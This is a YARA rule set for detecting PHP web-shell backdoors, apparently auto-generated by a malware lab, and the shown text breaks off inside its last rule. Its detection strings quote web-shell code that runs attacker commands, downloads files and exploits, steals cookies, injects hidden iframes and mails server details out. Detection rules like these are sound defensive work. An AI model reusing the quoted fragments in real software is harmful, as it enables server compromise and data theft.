/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-03-02
   Identifier: php__loose__php
   Reference: php__loose__php php_mixed auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule backdoor_php_goonshell_a_c__42e5fafe25af {
   meta:
      description = "php__loose__php - file backdoor_php_goonshell_a_c__42e5fafe25af"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "42e5fafe25af2d2600691a26144cc47320ccfd07a224b72452dfa7de2e86ece3"
   strings:
      $x1 = "$uakey = \"b5c3d0b28619de70bf5588505f4061f2\"; // MD5 encoded user-agent" fullword ascii /* score: '34.00'*/
      $x2 = "  'tools'=>'Tools','sqllogin'=>'SQL','email'=>'Email','upload'=>'Get Files','lookup'=>'List Domains','bshell'=>'Bindshell','kill" ascii /* score: '31.00'*/
      $s3 = "  'tools'=>'Tools','sqllogin'=>'SQL','email'=>'Email','upload'=>'Get Files','lookup'=>'List Domains','bshell'=>'Bindshell','kill" ascii /* score: '28.00'*/
      $s4 = "  if(exec(\"wget $file -b -O $updir/$filex\")){die(\"File has been uploaded.\");}" fullword ascii /* score: '27.00'*/
      $s5 = "  $act = array('cmd'=>'Command Execute','files'=>'File View','phpinfo'=>'PHP info', 'phpexec'=>'PHP Execute'," fullword ascii /* score: '26.00'*/
      $s6 = "$pass = \"47e331d2b8d07465515c50cb0fad1e5a\"; // MD5 encoded Password" fullword ascii /* score: '26.00'*/
      $s7 = "function cmd(){ // Command execution function" fullword ascii /* score: '24.00'*/
      $s8 = "  \"raptor - Linux <= 2.6.17.4\"=>\"http://someshit.net/files/xpl/raptor\"," fullword ascii /* score: '23.00'*/
      $s9 = "  req = urllib2.Request('http://www.seologs.com/ip-domains.html', urllib.urlencode({'domainname' : sys.argv[1]}))" fullword ascii /* score: '22.00'*/
      $s10 = "#'http://site.com/shl.php?cookie='+document.cookies</script>         #" fullword ascii /* score: '21.00'*/
      $s11 = "  \"rootbsd - BSD v?\"=>\"http://someshit.net/files/xpl/rootbsd\"," fullword ascii /* score: '21.00'*/
      $s12 = "$user  = \"af1035a85447f5aa9d21570d884b723a\"; // MD5 encoded User" fullword ascii /* score: '21.00'*/
      $s13 = "  echo(\"<h4>Execute PHP Code</h4>\");" fullword ascii /* score: '20.00'*/
      $s14 = "$IP = array(\"127.0.0.2\",\"127.0.0.1\"); // IP Addresses allowed to access shell" fullword ascii /* score: '20.00'*/
      $s15 = "  $cmd = exec(\"python lookup.py \" . $servinf[0], $ret);" fullword ascii /* score: '20.00'*/
      $s16 = "  <title>g00nshell v\" . $version . \" - \" . $servip . \"</title>\\n" fullword ascii /* score: '20.00'*/
      $s17 = "  $sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_port'], $_SESSION['sql_user'], $_SESSION['sql_password']" ascii /* score: '20.00'*/
      $s18 = "  $sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_port'], $_SESSION['sql_user'], $_SESSION['sql_password']" ascii /* score: '20.00'*/
      $s19 = "  \"--- Bindshells ---\"=>\"3\"," fullword ascii /* score: '20.00'*/
      $s20 = "                  'Running Processes'=>'ps -aux', 'Uname'=>'uname -a', 'Get UID'=>'id'," fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule backdoor_php_kaushell_a__6dd0830175bc {
   meta:
      description = "php__loose__php - file backdoor_php_kaushell_a__6dd0830175bc"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "6dd0830175bce21dd72848ae8ac149001ae15450a855612247e9f04201d32250"
   strings:
      $s1 = "if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass || empty($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_US" ascii /* score: '15.00'*/
      $s2 = "$login = \"admin\";" fullword ascii /* score: '15.00'*/
      $s3 = "//PHP Eval Code execution" fullword ascii /* score: '14.00'*/
      $s4 = "header('WWW-Authenticate: Basic realm=\"KA_uShell\"');" fullword ascii /* score: '13.00'*/
      $s5 = "passthru($_POST['c']);" fullword ascii /* score: '12.00'*/
      $s6 = "ER']<>$login)" fullword ascii /* score: '12.00'*/
      $s7 = "if (empty($_POST['wser'])) {$wser = \"whois.ripe.net\";} else $wser = $_POST['wser'];" fullword ascii /* score: '12.00'*/
      $s8 = "if (!empty($_POST['tot']) && !empty($_POST['tac'])) {" fullword ascii /* score: '12.00'*/
      $s9 = "if (isset($_POST['wq']) && $_POST['wq']<>\"\") {" fullword ascii /* score: '12.00'*/
      $s10 = ":<b>\" .base64_decode($_POST['tot']). \"</b>\";" fullword ascii /* score: '11.00'*/
      $s11 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" fullword ascii /* score: '11.00'*/
      $s12 = "$uploadfile = $_POST['path'].$_FILES['file']['name'];" fullword ascii /* score: '11.00'*/
      $s13 = "if (!empty($_GET['ac'])) {$ac = $_GET['ac'];}" fullword ascii /* score: '9.00'*/
      $s14 = "elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}" fullword ascii /* score: '9.00'*/
      $s15 = ":<b>\" .md5($_POST['tot']). \"</b>\";" fullword ascii /* score: '9.00'*/
      $s16 = "<title>KA_uShell 0.1.6</title>" fullword ascii /* score: '9.00'*/
      $s17 = "eval($_POST['ephp']);" fullword ascii /* score: '9.00'*/
      $s18 = "if (!empty($_POST['c'])){" fullword ascii /* score: '9.00'*/
      $s19 = "<form action=\"$self\" method=\"POST\">" fullword ascii /* score: '9.00'*/
      $s20 = "|<a href=$self?ac=shell>Shell</a>|" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 10KB and
      8 of them
}

rule backdoor_php_wieeeee__3609baa11a66 {
   meta:
      description = "php__loose__php - file backdoor_php_wieeeee__3609baa11a66"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "3609baa11a664ff05858b4ae9a68c8670448005ac8878a862ab16eb2b742ebbc"
   strings:
      $s1 = "if(isset($_POST['pass'])) //If the user made a login attempt, \"pass\" will be set eh?" fullword ascii /* score: '27.00'*/
      $s2 = "<title>'.getenv(\"HTTP_HOST\").' ~ Shell I</title>" fullword ascii /* score: '25.00'*/
      $s3 = "    'cmd' => 'Execute Command'," fullword ascii /* score: '23.00'*/
      $s4 = "function execute_command($method,$command)" fullword ascii /* score: '22.00'*/
      $s5 = "                print \"<form action=\\\"\".$me.\"?p=cmd&dir=\".realpath('.').\"\\\" method=POST><b>Command:</b><input type=text" ascii /* score: '21.00'*/
      $s6 = "        print shell_exec($command);" fullword ascii /* score: '20.00'*/
      $s7 = "mand><input type=submit value=\\\"Execute\\\"></form>\";" fullword ascii /* score: '18.00'*/
      $s8 = "function get_execution_method()" fullword ascii /* score: '17.00'*/
      $s9 = "if(isset($_GET['p']) && $_GET['p'] == \"logout\")" fullword ascii /* score: '17.00'*/
      $s10 = "                        execute_command(get_execution_method(),$_REQUEST['command']); //You want fries with that?" fullword ascii /* score: '17.00'*/
      $s11 = "$footer = '<tr><td><hr><center>&copy; <a href=\"http://www.ironwarez.info\">Iron</a> & <a href=\"http://www.rootshell-team.info" ascii /* score: '17.00'*/
      $s12 = "if(!empty($password) && !isset($_COOKIE[$cookiename]) or ($_COOKIE[$cookiename] != $password))" fullword ascii /* score: '15.00'*/
      $s13 = "//Do not cross this line! All code placed after this block can't be executed without being logged in!" fullword ascii /* score: '15.00'*/
      $s14 = "        exec($command,$result);" fullword ascii /* score: '15.00'*/
      $s15 = "                $link = mysql_connect($_POST['host'], $_POST['username'], $_POST['mysqlpass']) or die('Could not connect: ' . my" ascii /* score: '15.00'*/
      $s16 = "setcookie ($cookiename, \"\", time() - 3600);" fullword ascii /* score: '15.00'*/
      $s17 = "otShell Security Group</a></center></td></table></body></head></html>';" fullword ascii /* score: '14.00'*/
      $s18 = "    if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {" fullword ascii /* score: '14.00'*/
      $s19 = "r=\".get_color($file).\">\".perm($file).\"</font></a></td><td id=f>\".date (\"Y/m/d, H:i:s\", filemtime($file)).\"</td><tr>\";" fullword ascii /* score: '13.00'*/
      $s20 = "                $link = mysql_connect($_POST['host'], $_POST['username'], $_POST['mysqlpass']) or die('Could not connect: ' . my" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule backdoor_php_myshell_a_a__80dd2cc4e630 {
   meta:
      description = "php__loose__php - file backdoor_php_myshell_a_a__80dd2cc4e630"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "80dd2cc4e630bdee9a92d5c89d502908211e0bb8f1b7d524355d59829d41933d"
   strings:
      $s1 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c8" ascii /* score: '26.00'*/
      $s2 = "&nbsp;| ::::::::::&nbsp;<a href=\"http://www.digitart.net\" target=\"_blank\" style=\"text-decoration:none\"><b>MyShell</b> &cop" ascii /* score: '25.00'*/
      $s3 = "&nbsp;| ::::::::::&nbsp;<a href=\"http://www.digitart.net\" target=\"_blank\" style=\"text-decoration:none\"><b>MyShell</b> &cop" ascii /* score: '25.00'*/
      $s4 = "    if($ok==false &&$status && $autoErrorTrap)system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output." ascii /* score: '23.00'*/
      $s5 = "    if($ok==false &&$status && $autoErrorTrap)system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output." ascii /* score: '23.00'*/
      $s6 = "#Bear in mind that MyShell executes the command a second time in order to" fullword ascii /* score: '22.00'*/
      $s7 = "  An interactive PHP-page that will execute any command entered." fullword ascii /* score: '22.00'*/
      $s8 = "#to any address you want i.e.: noreplay@yourdomain.com" fullword ascii /* score: '21.00'*/
      $s9 = "#MyShell's text editor do not support usual commands in pico, vi etc." fullword ascii /* score: '20.00'*/
      $s10 = "#$autoErrorTrap Enable automatic error traping if command returns error." fullword ascii /* score: '18.00'*/
      $s11 = "           $shellOutput=\"MyShell: Error while saving $file:\\n$php_errormsg\\nUse back button to recover your changes.\";" fullword ascii /* score: '18.00'*/
      $s12 = " the script using wrong username or password:" fullword ascii /* score: '18.00'*/
      $s13 = "#$voidCommands is the list of commands that MyShell won't run by any means." fullword ascii /* score: '17.00'*/
      $s14 = "    system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output.txt\");" fullword ascii /* score: '17.00'*/
      $s15 = "       $shellOutput = \"MyShell: $voidCmd: void command for MyShell\";" fullword ascii /* score: '17.00'*/
      $s16 = "#Set up your user and password using $shellUser and $shellPswd." fullword ascii /* score: '17.00'*/
      $s17 = "#someone tries to access the script and fails to provide correct user and" fullword ascii /* score: '16.00'*/
      $s18 = "<? if ($command && $echoCommand) {" fullword ascii /* score: '15.00'*/
      $s19 = "         <title>$MyShellVersion - Access Denied</title>" fullword ascii /* score: '15.00'*/
      $s20 = "while (list ($key, $val) = each ($voidCommands)) {" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

rule backdoor_php_notfilefusion__9084a38bca04 {
   meta:
      description = "php__loose__php - file backdoor_php_notfilefusion__9084a38bca04"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "9084a38bca04b46cdd1f7ffebbbe9f54b81bdd84dcabab167022f4149aefff19"
   strings:
      $x1 = "echo \"<form method='GET'><input type='hidden' name='x' value='pma'><input type='hidden' name='sql_act' value='dump'><input type" ascii /* score: '33.00'*/
      $x2 = "echo \"<font color='green'>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecial" ascii /* score: '31.00'*/
      $s3 = "echo '<table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Dump DB:</b><form action=\"' . $pmau" ascii /* score: '30.00'*/
      $s4 = "# Dumped by N-SHELL.SQL" fullword ascii /* score: '30.00'*/
      $s5 = "$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\");" fullword ascii /* score: '29.00'*/
      $s6 = "echo \"<form method='POST'><input type='text' size='95' name=cmd value='\".htmlspecialchars($_POST['cmd']).\"'> <input type='sub" ascii /* score: '26.00'*/
      $s7 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\".sql\";" fullword ascii /* score: '25.00'*/
      $s8 = "echo \"<a href='\" . $url . \"x_pwned=home' class='navigatiepwned'>Home</a> | <a href='\" . $url . \"x_pwned=sql' class='navigat" ascii /* score: '24.00'*/
      $s9 = "echo '<td width=\"90%\" height=\"1\" valign=\"top\"><table cellSpacing=0 cellPadding=0 width=\"100%\" border=0><tr><td><table><t" ascii /* score: '24.00'*/
      $s10 = "echo '<form action=\"' . $pmaurl_final . '\" method=\"POST\"><input type=\"hidden\" name=\"sql_login\" value=\"' . htmlspecialch" ascii /* score: '23.00'*/
      $s11 = "echo \"<form action='\" . $pmaurl_final . \"' method='POST'><input type='hidden' name='sql_db' value='\".htmlspecialchars($sql_d" ascii /* score: '23.00'*/
      $s12 = "// script zoekt naar files die string mysql_select_db bevatten zodat je in de SQL commandline kunt inloggen met de db gegevens" fullword ascii /* score: '23.00'*/
      $s13 = "$sql_server).\":\".htmlspecialchars($sql_port).\" as \".htmlspecialchars($sql_login).\"@\".htmlspecialchars($sql_server).\" (pas" ascii /* score: '22.00'*/
      $s14 = "echo \"<br /><br /><input type='submit' name='submit' value='Dump'><br /><br /><b><sup>1</sup></b> - all, if empty\";" fullword ascii /* score: '22.00'*/
      $s15 = "echo \"Welcome on N-shell, the second dutch shell.<br /><br />Made by n0tiz and FiLEFUSiON.<br /><br /><br />Shouting @ DaiMoNto" ascii /* score: '21.00'*/
      $s16 = " htmlspecialchars($sql_passwd) . '\"><input type=\"hidden\" name=\"sql_server\" value=\"' . htmlspecialchars($sql_server) . '\">" ascii /* score: '20.00'*/
      $s17 = "echo \"<b>Result of execution this command</b>:\";" fullword ascii /* score: '20.00'*/
      $s18 = "echo '<form action=\"' . $pmaurl_final . '\" method=\"POST\"><input type=\"hidden\" name=\"sql_login\" value=\"' . htmlspecialch" ascii /* score: '20.00'*/
      $s19 = "echo \"<b>Download: </b>&nbsp;<input type='checkbox' name='sql_dump_download' value='1' checked><br /><br />\";" fullword ascii /* score: '20.00'*/
      $s20 = "echo \"<b>Result of execution this command</b>\";" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x0d20 and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule backdoor_php_bluehat_g__b3c5c56ed159 {
   meta:
      description = "php__loose__php - file backdoor_php_bluehat_g__b3c5c56ed159"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "b3c5c56ed1596c39048e98255cd9d667c272f1114e40200a75dadd4737d8379c"
   strings:
      $s1 = "elseif(function_exists('shell_exec')){" fullword ascii /* score: '14.00'*/
      $s2 = "$res = @ob_get_contents();" fullword ascii /* score: '14.00'*/
      $s3 = "$res = @shell_exec($cfe);" fullword ascii /* score: '14.00'*/
      $s4 = "@exec($cfe,$res);" fullword ascii /* score: '12.00'*/
      $s5 = "if(function_exists('exec')){" fullword ascii /* score: '12.00'*/
      $s6 = "echo \"Free:\".view_size($free).\"<br>\"; " fullword ascii /* score: '10.00'*/
      $s7 = " $SafeMode = @ini_get('safe_mode');" fullword ascii /* score: '9.00'*/
      $s8 = "$eseguicmd=ex($cmd);" fullword ascii /* score: '9.00'*/
      $s9 = "$dir = @getcwd();" fullword ascii /* score: '9.00'*/
      $s10 = "echo \"<br>Kernel:$ker<br>\";" fullword ascii /* score: '9.00'*/
      $s11 = " $PHPv = @phpversion();" fullword ascii /* score: '7.00'*/
      $s12 = "@system($cfe);" fullword ascii /* score: '7.00'*/
      $s13 = "while(!@feof($f)) { $res .= @fread($f,1024); }" fullword ascii /* score: '7.00'*/
      $s14 = "echo \"<br> blu3start Server_IP: {$IpServer} __ System:{$OS} __ Uname: {$UNAME} __ PHP: {$PHPv} __ safe mode: {$SafeMode} blu3en" ascii /* score: '7.00'*/
      $s15 = "echo $eseguicmd;" fullword ascii /* score: '7.00'*/
      $s16 = "@passthru($cfe);" fullword ascii /* score: '7.00'*/
      $s17 = "elseif(function_exists('system')){" fullword ascii /* score: '7.00'*/
      $s18 = "echo \"<br> blu3start Server_IP: {$IpServer} __ System:{$OS} __ Uname: {$UNAME} __ PHP: {$PHPv} __ safe mode: {$SafeMode} blu3en" ascii /* score: '7.00'*/
      $s19 = "elseif(function_exists('passthru')){" fullword ascii /* score: '7.00'*/
      $s20 = "$cmd=\"id\";" fullword ascii /* score: '6.00'*/
   condition:
      uint16(0) == 0x3e3f and filesize < 4KB and
      8 of them
}

rule backdoor_php_fatalshell_a__8e82bfe29771 {
   meta:
      description = "php__loose__php - file backdoor_php_fatalshell_a__8e82bfe29771"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "8e82bfe29771f23fcad99ae5aa07acbc4eca29e45ece634047d0adca00e78e62"
   strings:
      $x1 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - FaTaL Shell v1.0</title><meta http-equiv=\"Content-Type\" content=\"text" ascii /* score: '33.00'*/
      $x2 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - FaTaL Shell v1.0</title><meta http-equiv=\"Content-Type\" content=\"text" ascii /* score: '33.00'*/
      $s3 = "  elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$ret = @ob_get_contents();@ob_end_clean();}" fullword ascii /* score: '22.00'*/
      $s4 = "  elseif(function_exists('system')){@ob_start();@system($cmd);$ret = @ob_get_contents();@ob_end_clean();}" fullword ascii /* score: '22.00'*/
      $s5 = "<table width=\"100%\" bgcolor=\"#336600\" align=\"right\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\"><tr><td><table><tr><t" ascii /* score: '20.00'*/
      $s6 = "</tr></table><table style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgCol" ascii /* score: '20.00'*/
      $s7 = "//downloader" fullword ascii /* score: '19.00'*/
      $s8 = "  $content.='<tr><td><a href=\"#\" onclick=\"document.reqs.action.value=\\'editor\\';document.reqs.dir.value=\\''.$dir.'\\'; doc" ascii /* score: '18.00'*/
      $s9 = "  case fetch:shell(which('fetch').\" -o \".$_POST['filename'].\" -p \".$_POST['urldown'].\"\");break;" fullword ascii /* score: '18.00'*/
      $s10 = "  case curl:shell(which('curl').\" \".$_POST['urldown'].\" -o \".$_POST['filename'].\"\");break;" fullword ascii /* score: '18.00'*/
      $s11 = "<textarea readonly rows=\\\"15\\\" cols=\\\"150\\\">\".convert_cyr_string(htmlspecialchars(shell($_POST['command'])),\"d\",\"w\"" ascii /* score: '17.00'*/
      $s12 = "<textarea readonly rows=\\\"15\\\" cols=\\\"150\\\">\".convert_cyr_string(htmlspecialchars(shell($_POST['command'])),\"d\",\"w\"" ascii /* score: '17.00'*/
      $s13 = "  if(function_exists('exec')){@exec($cmd,$ret);$ret = join(\"\\n\",$ret);}" fullword ascii /* score: '17.00'*/
      $s14 = "  elseif(function_exists('shell_exec')){$ret = @shell_exec($cmd);}" fullword ascii /* score: '17.00'*/
      $s15 = "  $content.=\"<tr><td>HDD Secin:\";" fullword ascii /* score: '15.00'*/
      $s16 = "\" onclick=\"document.reqs.action.value='shell';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();\">| Shell </a></td" ascii /* score: '15.00'*/
      $s17 = "function shell($cmd)" fullword ascii /* score: '15.00'*/
      $s18 = "  case links:shell(which('links').\" -source \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");break;" fullword ascii /* score: '14.00'*/
      $s19 = "header('Content-Disposition: attachment; filename=\"'.$file.'\"');" fullword ascii /* score: '14.00'*/
      $s20 = "$content.=\"<form method=\\\"POST\\\">" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule backdoor_php_kaiowas__90f27e2313f4 {
   meta:
      description = "php__loose__php - file backdoor_php_kaiowas__90f27e2313f4"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "90f27e2313f47a12cf7b445cd09ef2b9ef19f8ddfcd112360fd4b8fc201b5919"
   strings:
      $s1 = "$codigo = \"<IFRAME src=\\\"http://usuarios.arnet.com.ar/alvarezluque/morgan.html\\\" width=\\\"0\\\" height=\\\"0\\\" framebord" ascii /* score: '20.00'*/
      $s2 = "$codigo = \"<IFRAME src=\\\"http://usuarios.arnet.com.ar/alvarezluque/morgan.html\\\" width=\\\"0\\\" height=\\\"0\\\" framebord" ascii /* score: '20.00'*/
      $s3 = "elseif(function_exists('shell_exec')){" fullword ascii /* score: '14.00'*/
      $s4 = "$res = @ob_get_contents();" fullword ascii /* score: '14.00'*/
      $s5 = "$res = @shell_exec($cfe);" fullword ascii /* score: '14.00'*/
      $s6 = "@exec($cfe,$res);" fullword ascii /* score: '12.00'*/
      $s7 = "if(function_exists('exec')){" fullword ascii /* score: '12.00'*/
      $s8 = "$n = $_SERVER['SCRIPT_NAME'];" fullword ascii /* score: '10.00'*/
      $s9 = "$eseguicmd=ex($cmd);" fullword ascii /* score: '9.00'*/
      $s10 = "$dir = @getcwd();" fullword ascii /* score: '9.00'*/
      $s11 = "@system($cfe);" fullword ascii /* score: '7.00'*/
      $s12 = "while(!@feof($f)) { $res .= @fread($f,1024); }" fullword ascii /* score: '7.00'*/
      $s13 = "echo $eseguicmd;" fullword ascii /* score: '7.00'*/
      $s14 = "@passthru($cfe);" fullword ascii /* score: '7.00'*/
      $s15 = "elseif(function_exists('system')){" fullword ascii /* score: '7.00'*/
      $s16 = "elseif(function_exists('passthru')){" fullword ascii /* score: '7.00'*/
      $s17 = "$directorio = $_SERVER['DOCUMENT_ROOT'];" fullword ascii /* score: '7.00'*/
      $s18 = "foreach (glob(\"$directorio/*.htm\") as $archivh) {" fullword ascii /* score: '7.00'*/
      $s19 = "foreach (glob(\"$directorio/*.php\") as $archivo) {" fullword ascii /* score: '7.00'*/
      $s20 = "if(!isset($_SERVER['DOCUMENT_ROOT']))" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule backdoor_php_cybershell_a__525501caeffb {
   meta:
      description = "php__loose__php - file backdoor_php_cybershell_a__525501caeffb"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "525501caeffbf6547d4a0bb2e79b4b59d1a72343282c1c8b4a66f2352ea674b0"
   strings:
      $s1 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c8" ascii /* score: '26.00'*/
      $s2 = " <a href=\"http://www.cyberlords.net\" target=\"_blank\">Cyber Lords Community</a>, 2002-2006</center>" fullword ascii /* score: '25.00'*/
      $s3 = " shell.php?pass=mysecretpass" fullword ascii /* score: '21.00'*/
      $s4 = "echo \"<head><meta http-equiv=\\\"refresh\\\" content=\\\"0;URL=$PHP_SELF?dbname=$dbname&table=$mtable&db_server=$db_server&db_u" ascii /* score: '20.00'*/
      $s5 = "echo \"<head><meta http-equiv=\\\"refresh\\\" content=\\\"0;URL=$PHP_SELF?dbname=$dbname&table=$mtable&db_server=$db_server&db_u" ascii /* score: '20.00'*/
      $s6 = "header(\"Content-Transfer-Encoding: binary\");" fullword ascii /* score: '17.00'*/
      $s7 = "if ((!isset($_GET[pass]) or ($_GET[pass]!=$aupassword)) and ($_SESSION[aupass]==\"\"))" fullword ascii /* score: '17.00'*/
      $s8 = "if ($_GET[pass]==$aupassword)" fullword ascii /* score: '17.00'*/
      $s9 = " *   Coded by Pixcher" fullword ascii /* score: '17.00'*/
      $s10 = "header(\"Content-Type: application/force-download; name=\\\"$filen\\\"\");" fullword ascii /* score: '16.00'*/
      $s11 = "exec(\\\"/bin/sh\\\");" fullword ascii /* score: '15.00'*/
      $s12 = "Login MySQL" fullword ascii /* score: '15.00'*/
      $s13 = " IP: <font face='Tahoma' size='1' color='#000000'>$REMOTE_ADDR &nbsp; $HTTP_X_FORWARDED_FOR</font><br>\";" fullword ascii /* score: '15.00'*/
      $s14 = "if (!empty($_GET[downloadfile])) downloadfile($_GET[downloadfile]);" fullword ascii /* score: '15.00'*/
      $s15 = "rite>del</a>/<a href=\"$PHP_SELF?downloadfile=$df/$files[$i]\">get</a>/<a href=\"$PHP_SELF?mailfile=$df/$files[$i]\">mail</a></t" ascii /* score: '15.00'*/
      $s16 = "hn.barker446@gmail.com\";mail($sd98, $sj98, $msg8873, \"From: $sd98\");" fullword ascii /* score: '14.00'*/
      $s17 = "header(\"Content-type: image/gif\");" fullword ascii /* score: '14.00'*/
      $s18 = "$s.=sprintf(\"%1s%1s%1s\", $world['read'], $world['write'], $world['execute']); " fullword ascii /* score: '14.00'*/
      $s19 = "$group[\"execute\"] = ($group['execute']=='x') ? 's' : 'S'; " fullword ascii /* score: '14.00'*/
      $s20 = "header(\"Content-Length: $size\");" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule backdoor_php_tdshell_a__36c418db3b44 {
   meta:
      description = "php__loose__php - file backdoor_php_tdshell_a__36c418db3b44"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "36c418db3b44c4d5b03bedd5995c5ee4d273dbbe125111251233252a933b78d8"
   strings:
      $x1 = "$this->out(\"<td>\" . $this->make_link(\"file\", array(\"act\" => \"edit\", \"name\" => $_f3f7e9f4a6ad2cc07b147484d501377d), \"[" ascii /* score: '37.00'*/
      $x2 = "$TDshell->TDshell_template[\"HTML_HEADER_HEAD_TITLE\"] = \"<title>$_SERVER[SERVER_NAME] - TDshell by TheDefaced (www.TheDefaced." ascii /* score: '32.00'*/
      $x3 = "$TDshell->TDshell_template[\"HTML_HEADER_HEAD_TITLE\"] = \"<title>$_SERVER[SERVER_NAME] - TDshell by TheDefaced (www.TheDefaced." ascii /* score: '32.00'*/
      $s4 = "$TDshell->TDshell_template[\"HTML_HEADER_MAIN\"] = \"<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"ht" ascii /* score: '30.00'*/
      $s5 = "$TDshell->TDshell_template[\"HTML_HEADER_BODY_SUF\"] = '</div></div></td><td align=\"right\" valign=\"top\" nowrap><div align=\"" ascii /* score: '29.00'*/
      $s6 = "$TDshell->TDshell_template[\"HTML_HEADER_HEAD_PRE\"] = \"<head><meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html;chars" ascii /* score: '29.00'*/
      $s7 = "$TDshell->TDshell_template[\"HTML_HEADER_BODY_PRE\"] .= '<div id=\"content_dat\"><table width=\"100%\" border=\"0\" cellspacing=" ascii /* score: '29.00'*/
      $s8 = "$TDshell->TDshell_template[\"HTML_HEADER_HEAD_PRE\"] = \"<head><meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html;chars" ascii /* score: '29.00'*/
      $s9 = "$TDshell->TDshell_template[\"HTML_FOOTER_MAIN\"] = '<div id=\"footer\">' . rphr(\"This shell was created using the\") . ' <b>' ." ascii /* score: '28.00'*/
      $s10 = "$TDshell->TDshell_template[\"HTML_HEADER_MAIN\"] = \"<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"ht" ascii /* score: '27.00'*/
      $s11 = "$_a9e5405d6581811dbff46e9ca3280bc1 .= \"<b>Your IP</b>: <a href='http://whois.domaintools.com/\" . $_SERVER['REMOTE_ADDR'] . \"'" ascii /* score: '26.00'*/
      $s12 = "$TDshell->TDshell_template[\"HTML_HEADER_BODY_PRE\"] .= '<div id=\"content_dat\"><table width=\"100%\" border=\"0\" cellspacing=" ascii /* score: '26.00'*/
      $s13 = "$this->out('<center><b>Execution Console</b></center><form method=\"post\" action=\"' . $this->make_link(\"exec\", NULL, NULL, T" ascii /* score: '25.00'*/
      $s14 = "rget='_blank'>\" . $_SERVER['REMOTE_ADDR'] . \"</a> <b>Server IP</b>: <a href='http://whois.domaintools.com/\" . $_SERVER['SERVE" ascii /* score: '25.00'*/
      $s15 = "$this->out('<center><b>Execution Console</b></center><form method=\"post\" action=\"' . $this->make_link(\"exec\", NULL, NULL, T" ascii /* score: '25.00'*/
      $s16 = "$this->out('<center><b>Execution Console</b></center><form method=\"post\" action=\"' . $this->make_link(\"exec\", NULL, NULL, T" ascii /* score: '25.00'*/
      $s17 = "$TDshell->TDshell_template[\"HTML_HEADER_HEAD_SCRIPT\"] = '<script language=\"javascript\" type=\"text/javascript\">" fullword ascii /* score: '24.00'*/
      $s18 = "$TDshell->TDshell_template[\"HTML_REL_LINK_BEG_PRE\"] = \"<a href='javascript:;' onclick='get_page(\\\"\";" fullword ascii /* score: '24.00'*/
